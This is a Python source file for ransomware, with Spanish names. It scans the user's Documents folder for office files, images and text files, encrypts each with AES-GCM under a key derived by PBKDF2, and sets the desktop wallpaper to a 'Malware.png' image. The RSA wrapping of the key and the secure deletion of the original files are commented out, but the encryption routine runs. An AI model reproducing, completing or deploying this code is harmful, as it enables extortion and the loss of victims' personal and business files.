import os
import secure_delete
import re
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from wallpaper import cambiarFondo
from Crypto.Protocol.KDF import PBKDF2
import base64

class Ransomware:
    def __init__(self) -> None:
        self.llavePublicaPEM =  os.getenv( 'LLAVE_PUBLICA' )
        self.password = ''
        self.archivos = []
        self.pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')
        self.listar_archivos_documentos()
        self.generarPassword()

    # Para listar los archivos en la carpeta Documents del usuario
    def listar_archivos_documentos( self ):
        documentos_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
        for root, _, files in os.walk(documentos_path):
            for file in files:
                if self.pattern.match(file): 
                    self.archivos.append(os.path.join(root, file))

    def generarPassword( self ):
        self.password = base64.urlsafe_b64encode( get_random_bytes( 16 ) ).decode( 'utf-8' )
        #llavePublica = RSA.import_key( self.llavePublicaPEM )
        #cipher = PKCS1_OAEP.new( llavePublica )  
        #passwordCifrada = cipher.encrypt( self.password )
        with open( 'password.enc', 'w' ) as f:
            f.write( self.password )

    def derivarLlaves( self, password, salt ):
            return PBKDF2(password, salt, dkLen=32, count=100000)

    def cifrarArchivos( self, extension='enc' ):
        # TODO: Cambiar el header
        header = b'header'    
        for archivo in self.archivos:
            with open(archivo, 'rb') as f:
                datos = f.read()

            salt = get_random_bytes(16)
            key = self.derivarLlaves( self.password.encode(), salt )
            cipher = AES.new(key, AES.MODE_GCM)
            cipher.update(header)
            ciphertext, tag = cipher.encrypt_and_digest(datos)
            documentoCifrado = f'{archivo}.{extension}'
            with open( documentoCifrado, 'wb' ) as f:
                f.write(salt)
                f.write(cipher.nonce)
                f.write(tag)
                f.write(ciphertext)
            # secure_delete.delete(archivo)

def main():
    r = Ransomware()
    r.cifrarArchivos()
    cambiarFondo('Malware.png')
main()